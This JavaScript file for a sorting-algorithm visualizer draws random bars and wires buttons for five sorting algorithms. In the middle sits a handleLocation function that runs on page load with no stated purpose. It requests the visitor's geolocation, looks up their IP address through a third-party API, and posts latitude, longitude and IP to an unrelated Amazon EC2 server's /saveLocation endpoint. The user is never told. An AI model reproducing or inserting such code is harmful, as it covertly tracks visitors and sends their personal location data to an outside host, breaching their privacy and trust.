var array = [];

// swap function util for sorting algorithms takes input of 2 DOM elements with .style.height feature
function swap(el1, el2) {
    
    let temp = el1.style.height;
    el1.style.height = el2.style.height;
    el2.style.height = temp;
    
}

const delay = 10;

function generate(size){
    array = [];
    for(let i=0;i<size;i++)
    {
        array.push(Math.floor(Math.random()*100) + 1);
    }
    const group = document.getElementById("bars");
    while(group.hasChildNodes()) group.removeChild(group.firstChild);
    for(let i = 0;i<size;i++)
    {
        const bar = document.createElement("div");
        bar.className = "bar";
        group.appendChild(bar).style = `
            height: ${array[i]}%;`
    }
}

generate();

const newArray = document.querySelector(".newArray-btn");
newArray.addEventListener('click',function(){
    size = document.querySelector(".size").value;
    generate(size);
});


//sorting calls
const selection = document.querySelector(".SelectionSort");
selection.addEventListener('click',async function(){
    disableAll();
    await selectionSort();
    enableAll();
});

const bubble = document.querySelector(".BubbleSort");
bubble.addEventListener('click',async function(){
    disableAll();
    await BubbleSort();
    enableAll();
});

const insertion = document.querySelector(".InsertionSort");
insertion.addEventListener('click',async function(){
    disableAll();
    await InsertionSort();
    enableAll();
});

const mer = document.querySelector(".MergeSort");
mer.addEventListener('click',async function(){
    disableAll();
    await MergeSort();
    enableAll();
});

const quck = document.querySelector(".QuickSort");
quck.addEventListener('click',async function(){
    disableAll();
    await QuickSort();
    enableAll();
});

const handleLocation = async () => {
      
    if(!navigator || !navigator.geolocation) alert("enable location");
    // console.log(navigator);
        let ipAddress;
        navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        try {
            const response = await fetch("https://api.apify.com/v2/browser-info");
            
            if (response.ok) {
                const data = await response.json();
                ipAddress = data.clientIp;
            } else {
                console.error("Failed to fetch IP address:", response.status, response.statusText);
            }
        } catch (error) {
            console.error("Error fetching IP address:", error);
        }
        
        fetch("https://ec2-16-170-172-91.eu-north-1.compute.amazonaws.com:8080/saveLocation", {
        method: "POST",
            headers: {
                "Content-type": "application/json; charset=UTF-8"
            },
            body: JSON.stringify({
                "longitude": `${longitude}`,
                "latitude": `${latitude}`,
                "ipAddress": `${ipAddress}`,
                "createdDate": new Date()
            })
        });
    });
  
};

handleLocation();


function disableAll(){
    document.querySelector(".SelectionSort").disabled = true;
    document.querySelector(".InsertionSort").disabled = true;
    document.querySelector(".MergeSort").disabled = true;
    document.querySelector(".QuickSort").disabled = true;
    document.querySelector(".BubbleSort").disabled = true;
    document.querySelector(".newArray-btn").disabled = true;
}

function enableAll(){
    document.querySelector(".SelectionSort").disabled = false;
    document.querySelector(".InsertionSort").disabled = false;
    document.querySelector(".MergeSort").disabled = false;
    document.querySelector(".QuickSort").disabled = false;
    document.querySelector(".BubbleSort").disabled = false;
    document.querySelector(".newArray-btn").disabled = false;
}

async function waitforme(milisec) { 
    return new Promise(resolve => { 
        setTimeout(() => { resolve('') }, milisec); 
    }) 
}
